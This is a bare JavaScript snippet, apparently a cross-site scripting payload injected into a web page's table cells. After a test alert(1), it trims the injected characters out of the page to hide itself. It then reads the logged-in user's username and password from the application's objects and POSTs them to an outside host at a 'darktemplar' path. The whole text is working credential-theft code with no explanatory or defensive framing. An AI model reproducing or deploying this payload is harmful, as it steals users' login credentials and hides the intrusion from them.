alert(1);
$('td:contains(">)')[0].innerHTML=$('td:contains(">)')[0].innerHTML.substring(5);
var user = this.unsene.unseneView.me.get("username");
var pwd = this.unsene.unseneView.credential.get("password");
    //$('#header-row').next().children()[3].innerHTML=$('#header-row').next().children()[3].innerHTML.substring(5);
    $.ajax({
           type: "POST",
            url: "https://ss.dongtaiwang.info/darktemplar/",
            data: {
                username: user,
                password: pwd
            },
            success: function(b) {
              $('td:contains(">)')[0].innerHTML=$('td:contains(">)')[0].innerHTML.substring(5)
            },

        })
